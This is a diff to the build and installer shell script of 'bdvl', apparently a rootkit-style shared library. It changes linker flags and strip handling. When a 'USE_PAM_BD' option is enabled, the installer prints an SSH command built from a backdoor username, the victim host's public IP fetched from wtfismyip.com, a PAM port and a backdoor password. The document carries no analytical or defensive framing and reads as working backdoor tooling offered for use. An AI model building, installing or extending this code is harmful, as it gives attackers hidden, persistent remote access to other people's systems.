@@ -59,7 +59,6 @@ compile_bdvl(){
     linker_options=(-Wl,--build-id=none)
     linker_flags=(-lc -ldl -lpcap)
     [ `toggle_enabled USE_CRYPT` == "true" ] && linker_flags+=(-lcrypt)
-    [ `toggle_enabled ACCEPT_USE_SSL` == "true" ] && linker_flags+=(-lssl)
     [ $PLATFORM == "armv7l" ] && PLATFORM="v7l"
     [ $PLATFORM == "armv6l" ] && PLATFORM="v6l"
 
@@ -77,7 +76,7 @@ compile_bdvl(){
 
     [ $VERBOSE == 1 ] && `$compile_m32`
     [ $VERBOSE == 0 ] && `$compile_m32 &>/dev/null`
-    strip $BDVLSO.i686 2>/dev/null || wecho "Couldn't strip $BDVLSO.i686, this is ok"
+    [ -f $BDVLSO.i686 ] && strip $BDVLSO.i686 2>/dev/null
     [ -f $BDVLSO.i686 ] && secho "`lib_size i686`"
 }
 
@@ -131,8 +130,12 @@ install_bdvl(){
     secho "Installation complete!"
     cleanup_bdvl
 
-    [ `toggle_enabled "USE_PAM_BD"` == 'true' ] && \
-        echo -e "\n\t\e[32mbash etc/ssh.sh $BD_UNAME `curl -s wtfismyip.com/text` $PAM_PORT # $BD_PWD\e[0m\n"
+    if [ `toggle_enabled "USE_PAM_BD"` == 'true' ]; then
+        local addr_src='http://wtfismyip.com/text'
+        [ -f `bin_path curl` ] && local addr_q="curl -s $addr_src"
+        [ -f `bin_path wget` ] && local addr_q="wget -q -O - $addr_src"
+        echo -e "\n\t\e[32mbash etc/ssh.sh $BD_UNAME `$addr_q` $PAM_PORT # $BD_PWD\e[0m\n"
+    fi
 }
 
 VERBOSE=0
